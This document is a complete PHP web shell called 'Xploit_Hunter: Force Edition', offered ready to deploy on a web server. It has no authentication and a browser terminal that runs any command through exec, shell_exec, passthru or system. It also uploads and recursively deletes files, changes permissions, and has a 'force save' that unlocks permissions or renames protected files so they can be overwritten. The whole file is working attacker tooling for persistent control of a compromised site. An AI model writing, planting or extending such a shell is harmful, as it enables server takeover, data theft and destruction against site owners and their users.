<?php
/**
 * --- Xploit_Hunter: Force Edition ---
 **/
error_reporting(0);
session_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

// --- CONFIG ---
$title = "Xploit_Hunter";
$theme_bg = "#000b1d"; // Dark Navy
$theme_fg = "#00d4ff"; // Bright Blue
$theme_border = "#002b5c";
$theme_table = "#001631";

// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    return basename($filename);
}

function exe($cmd) {
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    }
    return "Error: Command execution is blocked.";
}

function perms($file){
    $perms = @fileperms($file);
    if ($perms === false) return '????';
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function delete_recursive($target) {
    if (!file_exists($target)) return true;
    if (!is_dir($target)) return unlink($target);
    $items = scandir($target);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($target);
}

function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    $params = ['path' => $redirect_path];
    if ($msg_type) $params['msg_type'] = $msg_type;
    if ($msg_text) $params['msg_text'] = $msg_text;
    header("Location: ?" . http_build_query($params));
    exit();
}

// --- SETUP ---
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\','/',$path);

// --- HANDLERS ---
if(isset($_FILES['file_upload'])){
    $file_name = sanitizeFilename($_FILES['file_upload']['name']);
    if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)){
        redirect_with_message('success', 'UPLOAD SUCCESSFUL: ' . $file_name, $path);
    }else{
        redirect_with_message('error', 'Upload Failed!', $path);
    }
}

if(isset($_GET['option']) && isset($_POST['opt_action'])){
    $target_full_path = $_POST['path_target'];
    $action = $_POST['opt_action'];
    $current_dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
    switch ($action) {
        case 'delete':
            if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESSFUL !!', $current_dir);
            else redirect_with_message('error', 'Cannot Delete File!', $current_dir);
            break;
        case 'chmod_save':
            $perm = octdec($_POST['perm_value']);
            if(chmod($target_full_path,$perm)) redirect_with_message('success', 'CHMOD SUCCESSFUL !!', $current_dir);
            else redirect_with_message('error', 'Chmod Failed!', $current_dir);
            break;
        case 'rename_save':
            $new_name = dirname($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']);
            if(rename($target_full_path, $new_name)) redirect_with_message('success', 'RENAME SUCCESSFUL !!', $current_dir);
            else redirect_with_message('error', 'Rename Failed!', $current_dir);
            break;
        case 'edit_save':
            // FORCE WRITE: Try to unlock permissions and save directly
            @chmod($target_full_path, 0666);
            if(file_put_contents($target_full_path, $_POST['src_content']) !== false) {
                redirect_with_message('success', 'SAVE SUCCESSFUL !!', $current_dir);
            } else {
                // RENAME TRICK: If edit is blocked, rename old and write new
                $bak = $target_full_path . '.bak';
                @rename($target_full_path, $bak);
                if(file_put_contents($target_full_path, $_POST['src_content']) !== false) {
                    redirect_with_message('success', 'FORCE SAVE SUCCESSFUL !!', $current_dir);
                } else {
                    redirect_with_message('error', 'WRITE ERROR: System lock or Disk full.', $current_dir);
                }
            }
            break;
    }
}

if(isset($_GET['create_new'])) {
    $target_new = $path . '/' . sanitizeFilename($_POST['create_name']);
    if ($_POST['create_type'] == 'file') {
        if (file_put_contents($target_new, '') !== false) redirect_with_message('success', 'File created.', $path);
    } else {
        if (mkdir($target_new)) redirect_with_message('success', 'Folder created.', $path);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<title><?php echo $title; ?></title>
<style>
  body { background-color: <?php echo $theme_bg; ?>; color: <?php echo $theme_fg; ?>; font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; }
  h1 { color: #fff; text-align: center; font-size: 32px; text-shadow: 0 0 10px #0051ff; margin: 20px 0; }
  a { color: #0088ff; text-decoration: none; }
  a:hover { color: #fff; text-shadow: 0 0 5px #00d4ff; }
  table { width: 95%; margin: 20px auto; border-collapse: collapse; background-color: <?php echo $theme_table; ?>; border: 1px solid <?php echo $theme_border; ?>; }
  th, td { border: 1px solid <?php echo $theme_border; ?>; padding: 10px; text-align: left; }
  .first { background-color: #001025; color: #ffd60a; }
  .main-menu { text-align: center; padding: 15px; background: #001025; border-bottom: 1px solid <?php echo $theme_fg; ?>; }
  .main-menu a { margin: 0 12px; font-weight: bold; }
  .section-box { border: 1px solid <?php echo $theme_fg; ?>; padding: 15px; margin: 20px auto; width: 90%; background: #001025; }
  input, textarea, select { background: #000; color: #00d4ff; border: 1px solid <?php echo $theme_border; ?>; padding: 8px; font-family: 'Share Tech Mono'; }
  input[type="submit"] { background: #002b5c; color: #fff; border: 1px solid #00d4ff; cursor: pointer; }
  input[type="submit"]:hover { background: #00d4ff; color: #000; }
  .message { text-align: center; padding: 10px; margin: 10px auto; width: 90%; font-weight: bold; border-radius: 4px; }
  .message.success { background: #004b23; color: #ccff33; }
  .message.error { background: #590d22; color: #ff4d6d; }
</style>
</head>
<body>
    <div style="text-align: center; padding: 15px;">
        <img src="https://raw.githubusercontent.com/xploithunter59-sudo/Xploit_Hunter/main/Xploit_Hunter.png" width="150" style="border: 2px solid #00d4ff; border-radius: 15px;">
        <h1><?php echo $title; ?></h1>
    </div>

<?php if(isset($_GET['msg_text'])) echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; ?>

<div class="main-menu">
    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">TERMINAL</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">UPLOAD</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=create_form">NEW ITEM</a> |
    <a href="?">HOME</a>
</div>

<div style="text-align: center; padding: 10px;">
    DIR: <?php echo htmlspecialchars($path); ?>
</div>

<?php
$show_list = true;
if (isset($_GET['action'])) {
    $show_list = false;
    echo '<div class="section-box">';
    switch ($_GET['action']) {
        case 'cmd':
            echo '<h3>Terminal</h3><form method="POST"><input type="text" name="cmd_input" placeholder="Type command..." style="width:80%"><input type="submit" name="do_cmd" value="EXE"></form>';
            if(isset($_POST['do_cmd'])) echo '<pre style="color:#0f0; background:#000; padding:10px;">'.htmlspecialchars(exe($_POST['cmd_input'])).'</pre>';
            break;
        case 'upload_form':
            echo '<h3>Upload</h3><form enctype="multipart/form-data" method="POST"><input type="file" name="file_upload"><input type="submit" value="UPLOAD NOW"></form>';
            break;
        case 'create_form':
            echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.urlencode($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select><input type="text" name="create_name" placeholder="Name..."><input type="submit" value="CREATE"></form>';
            break;
        case 'edit_form':
            $target = $_GET['target_file'];
            echo '<h3>Editing: '.basename($target).'</h3>';
            echo '<form method="POST" action="?option=true&path='.urlencode($path).'">';
            echo '<textarea name="src_content" style="width:100%; height:400px;">'.htmlspecialchars(@file_get_contents($target)).'</textarea>';
            echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($target).'">';
            echo '<input type="hidden" name="opt_action" value="edit_save">';
            echo '<br><input type="submit" value="FORCE SAVE">';
            echo '</form>';
            break;
        case 'rename_form':
            echo '<h3>Rename</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="new_name_value" value="'.basename($_GET['target_file']).'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"></form>';
            break;
        case 'chmod_form':
            $cp = substr(sprintf('%o', @fileperms($_GET['target_file'])), -4);
            echo '<h3>Chmod</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="perm_value" value="'.$cp.'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHANGE"></form>';
            break;
    }
    echo '</div>';
}

if ($show_list) {
    echo '<table><tr class="first"><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
    foreach (@scandir($path) as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = $path . '/' . $item;
        echo '<tr>';
        echo '<td><a href="?path='.urlencode($full).'">'.$item.'</a></td>';
        echo '<td>'.(is_dir($full) ? 'DIR' : round(filesize($full)/1024, 2).' KB').'</td>';
        echo '<td>'.perms($full).'</td>';
        echo '<td><a href="?action=edit_form&target_file='.urlencode($full).'&path='.urlencode($path).'">Edit</a> | <a href="?action=rename_form&target_file='.urlencode($full).'&path='.urlencode($path).'">Rename</a></td>';
        echo '</tr>';
    }
    echo '</table>';
}
?>
</body>
</html>
